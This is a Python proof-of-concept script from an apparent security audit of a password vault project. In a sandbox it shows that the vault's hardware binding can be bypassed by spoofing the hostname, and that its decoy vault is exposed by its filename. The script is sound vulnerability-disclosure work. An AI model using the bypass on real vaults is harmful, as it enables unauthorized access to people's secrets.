#!/usr/bin/env python3
"""PoC 10: (A) 'Donanim parmak izi' kamuya acik verilerden turetiliyor -> baglama baypasi
         (B) Decoy kasa dosya adiyla ifsa oluyor -> plausible deniability cokuyor.

Zafiyet A: get_hardware_fingerprint() = SHA256(hostname + mimari + COMPUTERNAME)[:24].
Gercek donanim (disk seri no, TPM, MAC) kullanilmaz; uc bilesen de saldirgan tarafindan
bilinebilir/sahtelenebilir.
Zafiyet B: Duress parolasiyla olusturulan kasa '<profil>_decoy.mvat' adiyla diske yazilir;
dosya sistemine bakan herkes ikinci bir kasanin varligini aninda gorur.
"""
import os
import sys
import platform
import shutil

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc10"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import vault_storage as vs
from military_vault import VaultSecurityError


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


banner("PoC 10-A: Donanim parmak izi sahtelenebilir / kamuya acik")

real_node = platform.node
print(f"[+] platform.node()={real_node()!r}  platform.machine()={platform.machine()!r}  COMPUTERNAME={os.environ.get('COMPUTERNAME', '')!r}")
fp_real = vs.get_hardware_fingerprint()
print(f"[+] Gercek parmak izi: {fp_real}")

platform.node = lambda: "ATTACKER-LAPTOP"
fp_attacker = vs.get_hardware_fingerprint()
platform.node = real_node
print(f"[+] 'Saldirgan makinesi' parmak izi: {fp_attacker}")
print(f"[+] Donanim bagimliligi: yalnizca hostname/mimari/env'den geliyor (TPM/disk seri no YOK)")

PASSWORD = "BindTest!2026"
vs.init_vault(master_password=PASSWORD, profile_name="hwb", bind_to_hardware=True)
print("\n[+] Donanima bagli kasa olusturuldu (goc aninda hw_id={...})".replace("{...}", vs.get_hardware_fingerprint()))

platform.node = lambda: "ATTACKER-LAPTOP"
try:
    vs.unlock_vault(PASSWORD, profile_name="hwb")
    print("[?] Farkli makinede acildi (beklenmiyordu)")
except VaultSecurityError:
    print("[+] Saldırgan makinesi (farkli hostname): kasa ACILAMADI (beklenen)")

platform.node = real_node
data, is_decoy, eff = vs.unlock_vault(PASSWORD, profile_name="hwb")
print("[+] Saldırgan kurbanın hostname'ini ogrendi (log, ag paylasimi vb.) ve ayni degeri taklit etti:")
print(f"    Kasa ACILDI -> veri alindi: profile={data.get('profile_name')}, items={len(data.get('items', []))}")

banner("PoC 10-B: Decoy kasa dosya adiyla ifsa oluyor")

vs.init_vault(master_password="RealPass!2026", duress_password="DuressPass!2026", profile_name="covert")
files = sorted(os.listdir("profiles"))
print(f"[+] profiles/ dizin icerigi: {files}")
decoy = [f for f in files if "_decoy.mvat" in f]
print(f"[!] '_decoy' iceren dosyalar: {decoy}")
print("[!] README iddiasi: 'matematiksel ve gorsel olarak imkansiz... ikinci kasanin aktif oldugunu tespit etmek'")
print("[!] Gercek: ikinci kasanin varligi dosya adindan aninda anlasiliyor.")

print("\n" + "-" * 72)
print("KANIT: (A) Donanim baglama, kamuya acik/sahtelenebilir hostname-mimari-env uclusune dayanir.")
print("       (B) Plausible deniability, '_decoy.mvat' dosya adi ve ayri dosya yapisi yuzunden")
print("           adli incelemede ilk saniyede coker.")
print("-" * 72)
